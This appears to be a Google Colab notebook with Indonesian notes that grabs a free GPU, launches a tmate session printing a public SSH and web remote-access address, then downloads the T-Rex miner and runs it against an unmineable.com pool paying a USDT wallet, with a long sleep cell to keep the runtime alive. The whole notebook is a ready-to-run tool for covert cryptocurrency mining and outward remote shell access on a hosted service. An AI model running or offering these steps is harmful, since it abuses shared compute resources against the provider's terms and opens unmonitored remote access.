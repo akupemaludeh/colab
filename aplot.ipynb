{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Copy of a.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "Dapatkan GPU Disini ..."
      ],
      "metadata": {
        "id": "0lsUeWBCPcx1"
      }
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "kYTd5eO8AKHM",
        "cellView": "form"
      },
      "source": [
        "#@title HAJAR\n",
        "import torch\n",
        "\n",
        "if torch.cuda.is_available():\n",
        "    device = torch.device(\"cuda:0\")\n",
        "    print(\"GPU\")\n",
        "else:\n",
        "    device = torch.device(\"cpu\")\n",
        "    print(\"CPU\")\n",
        "\n",
        " !nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Cek GPU yang di dapatkan..."
      ],
      "metadata": {
        "id": "Qw2QB7v6PjL8"
      }
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "OKzU0gPpBgAX"
      },
      "source": [
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Jalankan Ini... !"
      ],
      "metadata": {
        "id": "xLMHrT6QPXRF"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!pkill -9 tmate\n",
        "!wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null\n",
        "!tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null\n",
        "!rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1\n",
        "!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready\n",
        "!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p \"Connect with SSH address: #{tmate_ssh}\"\n",
        "!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p \"Connect with web: #{tmate_web}\"\n"
      ],
      "metadata": {
        "id": "bt9OtwdhO_mi"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Running ya... !!"
      ],
      "metadata": {
        "id": "IXK21L4gPK2e"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!wget https://github.com/trexminer/T-Rex/releases/download/0.17.2/t-rex-0.17.2-linux-cuda10.0.tar.gz\n",
        "!tar -xvf t-rex-0.17.2-linux-cuda10.0.tar.gz\n",
        "!mv t-rex terex\n",
        "!chmod +x terex \n",
        "!sudo ./terex -a ethash -o ethash.unmineable.com:3333 -u USDT:TPg2a2KFQzmsTQEvgEYod2q346YShhtbw9.brutal#9by0-sdh3 -p x\n",
        "\n"
      ],
      "metadata": {
        "id": "XQWryTiDDhHx"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!sleep 999999"
      ],
      "metadata": {
        "id": "u0Lm1NDGPHdx"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}